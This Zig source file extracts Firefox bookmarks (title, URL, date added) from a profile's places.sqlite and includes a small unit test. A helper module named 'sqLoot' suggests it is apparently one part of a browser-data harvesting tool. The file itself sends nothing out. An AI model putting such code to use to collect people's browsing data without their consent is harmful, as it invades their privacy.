const std = @import("std");
const file_io = @import("../parsers/file_io.zig");
const sqLoot = @import("../parsers/sqLoot.zig");

pub const BookmarkEntry = struct {
    title: []const u8,
    url: []const u8,
    date_added: i64,
};

pub fn extractBookmarks(allocator: std.mem.Allocator, profile_dir: []const u8, out: *std.ArrayList(BookmarkEntry)) void {
    var path_buf: [512]u8 = undefined;
    const db_path = std.fmt.bufPrint(&path_buf, "{s}\\places.sqlite", .{profile_dir}) catch return;

    const mapped = file_io.MappedFile.open(db_path) orelse return;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return;
    defer db.deinit();

    const bookmark_rows = db.readTable("moz_bookmarks") catch return;
    defer {
        for (bookmark_rows) |r| allocator.free(r);
        allocator.free(bookmark_rows);
    }

    for (bookmark_rows) |row| {
        if (row.len < 3) continue;
        const fk = if (row[0] == .int) row[0].int else continue;
        const title = if (row[1] == .text) row[1].text else "";
        const date_added = if (row[2] == .int) row[2].int else 0;

        // Query moz_places for the URL by fk
        var url_found: ?[]const u8 = null;

        if (db.findTable("moz_places")) |places_root| {
            var url_cells = std.ArrayList(sqLoot.Cell).init(allocator);
            defer {
                for (url_cells.items) |c| allocator.free(c.payload.values);
                url_cells.deinit();
            }
            db.collectLeafCells(places_root, &url_cells) catch {};

            for (url_cells.items) |cell| {
                const vals = cell.payload.values;
                if (vals.len >= 1 and vals[0] == .text) {
                    if (cell.row_id == fk) {
                        url_found = vals[0].text;
                        break;
                    }
                }
            }
        }

        const url = url_found orelse continue;
        const t = allocator.dupe(u8, title) catch break;
        const u = allocator.dupe(u8, url) catch break;
        out.append(.{ .title = t, .url = u, .date_added = date_added }) catch break;
    }
}

test "extractBookmarks file not found returns empty" {
    var list = std.ArrayList(BookmarkEntry).init(std.testing.allocator);
    defer {
        for (list.items) |b| {
            std.testing.allocator.free(b.title);
            std.testing.allocator.free(b.url);
        }
        list.deinit();
    }
    extractBookmarks(std.testing.allocator, "C:\\nonexistent", &list);
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}
